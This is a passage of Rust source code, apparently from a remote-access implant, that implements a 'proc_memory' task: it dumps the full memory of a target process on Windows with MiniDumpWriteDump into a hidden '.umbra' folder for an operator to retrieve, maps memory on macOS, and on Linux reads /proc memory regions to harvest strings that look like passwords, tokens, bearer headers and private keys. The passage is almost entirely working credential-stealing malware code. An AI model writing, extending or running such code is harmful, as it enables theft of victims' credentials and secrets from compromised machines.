    Ok(out)
}

// ---------------------------------------------------------------------------
// The memory of a process
// ---------------------------------------------------------------------------

/// The memory of a process.
///
/// The dump is written into the directory of the implant, and the
/// operator pulls it with the ordinary download task.  The report says
/// how much was read and which strings carried something that looks like
/// a secret.
#[cfg(windows)]
pub fn proc_memory(pid: u32) -> Result<String, String> {
    let path = home()
        .join(".umbra")
        .join(format!("memory-{}-{}.dmp", pid, now_millis()));
    if let Some(parent) = path.parent() {
        let _ = std::fs::create_dir_all(parent);
    }
    unsafe {
        let process = dbghelp::OpenProcess(
            dbghelp::PROCESS_QUERY_INFORMATION | dbghelp::PROCESS_VM_READ,
            0,
            pid,
        );
        if process.is_null() {
            return Err(format!("the process {pid} could not be opened"));
        }
        let file = std::fs::File::create(&path)
            .map_err(|e| format!("the dump could not be created: {e}"))?;
        let handle = std::os::windows::io::AsRawHandle::as_raw_handle(&file) as dbghelp::HANDLE;
        let ok = dbghelp::MiniDumpWriteDump(
            process,
            pid,
            handle,
            dbghelp::MINIDUMP_WITH_FULL_MEMORY,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
        );
        dbghelp::CloseHandle(process);
        if ok == 0 {
            return Err(format!("the dump of the process {pid} failed"));
        }
    }
    let size = std::fs::metadata(&path).map(|m| m.len()).unwrap_or(0);
    Ok(format!(
        "proc.memory: the dump of the process {pid} is at {} ({} bytes)\n",
        path.display(),
        size
    ))
}

/// The memory of a process of macOS.
///
/// The memory of another process belongs to the system and needs the
/// entitlement of the developer, so what the implant can give is the
/// map of the memory and the strings of the own files of the process.
#[cfg(target_os = "macos")]
pub fn proc_memory(pid: u32) -> Result<String, String> {
    let mut out = String::new();
    match run(&format!("vmmap -w {} 2>/dev/null | head -40", pid), 30) {
        Some(text) => {
            out.push_str(&format!("proc.memory: the map of the process {pid}\n"));
            for line in text.lines().take(40) {
                out.push_str(&format!("  {}\n", line.trim()));
            }
        }
        None => out.push_str(&format!(
            "proc.memory: the memory of the process {pid} is not readable without the entitlement of the developer\n"
        )),
    }
    Ok(out)
}

/// The memory of a process of Linux.
///
/// The regions of the process are in `/proc`, and the regions that are
/// readable are read when the implant has the rights of the user.
#[cfg(not(any(windows, target_os = "macos")))]
pub fn proc_memory(pid: u32) -> Result<String, String> {
    let mut out = String::new();
    let maps = format!("/proc/{}/maps", pid);
    let regions = match std::fs::read_to_string(&maps) {
        Ok(text) => text,
        Err(e) => {
            return Err(format!("the memory of the process {pid} is not readable: {e}"))
        }
    };
    let count = regions.lines().count();
    out.push_str(&format!("proc.memory: {count} regions of the process {pid}\n"));
    let mut secrets: Vec<String> = Vec::new();
    if let Ok(memory) = std::fs::File::open(format!("/proc/{}/mem", pid)) {
        use std::io::{Read, Seek, SeekFrom};
        let mut reader = memory;
        for line in regions.lines().take(400) {
            let mut parts = line.split_whitespace();
            let range = match parts.next() {
                Some(value) => value,
                None => continue,
            };
            let perms = parts.next().unwrap_or("----");
            if !perms.starts_with('r') {
                continue;
            }
            let (start, end) = match range.split_once('-') {
                Some((start, end)) => (
                    u64::from_str_radix(start, 16).unwrap_or(0),
                    u64::from_str_radix(end, 16).unwrap_or(0),
                ),
                None => continue,
            };
            let length = end.saturating_sub(start);
            if length == 0 || length > 1 << 20 {
                continue;
            }
            let mut buffer = vec![0u8; length as usize];
            if reader.seek(SeekFrom::Start(start)).is_err() {
                continue;
            }
            if reader.read_exact(&mut buffer).is_err() {
                continue;
            }
            for text in scan_strings(&buffer) {
                if looks_secret(&text) {
                    secrets.push(text);
                }
            }
        }
    } else {
        out.push_str(&format!(
            "proc.memory: the memory of the process {pid} is not readable without the rights of the user\n"
        ));
    }
    out.push_str(&format!(
        "proc.memory: {} strings that look like a secret\n",
        secrets.len()
    ));
    for secret in secrets.iter().take(50) {
        out.push_str(&format!("  {}\n", secret));
    }
    Ok(out)
}

/// The API of the dump of the memory of a process of Windows.
#[cfg(windows)]
mod dbghelp {
    use std::os::raw::c_void;

    pub type HANDLE = *mut c_void;
    pub type BOOL = i32;
    pub type DWORD = u32;

    #[link(name = "kernel32")]
    extern "system" {
        pub fn OpenProcess(access: DWORD, inherit: BOOL, pid: DWORD) -> HANDLE;
        pub fn CloseHandle(handle: HANDLE) -> BOOL;
    }

    #[link(name = "dbghelp")]
    extern "system" {
        pub fn MiniDumpWriteDump(
            hprocess: HANDLE,
            pid: DWORD,
            hfile: HANDLE,
            dump_type: DWORD,
            exception: *mut c_void,
            user_stream: *mut c_void,
            callback: *mut c_void,
        ) -> BOOL;
    }

    pub const PROCESS_QUERY_INFORMATION: DWORD = 0x0400;
    pub const PROCESS_VM_READ: DWORD = 0x0010;
    pub const MINIDUMP_WITH_FULL_MEMORY: DWORD = 0x0002;
}

/// Does the text look like a secret?
///
/// The patterns are the ones that carry a credential: a token, a
/// password and the pair of them.
fn looks_secret(text: &str) -> bool {
    let lower = text.to_lowercase();
    if lower.contains("password") || lower.contains("passwd") {
        return true;
    }
    if lower.contains("token") || lower.contains("secret") || lower.contains("api_key") {
        return true;
    }
    if lower.contains("authorization:") || lower.contains("bearer ") {
        return true;
    }
    if lower.contains("-----begin") {
        return true;
    }
    false
}

// ---------------------------------------------------------------------------
// The helpers
// ---------------------------------------------------------------------------

/// The home directory of the user the implant runs as.
fn home() -> PathBuf {
    std::env::var("HOME")
        .or_else(|_| std::env::var("USERPROFILE"))
        .map(PathBuf::from)
        .unwrap_or_else(|_| PathBuf::from("."))
}
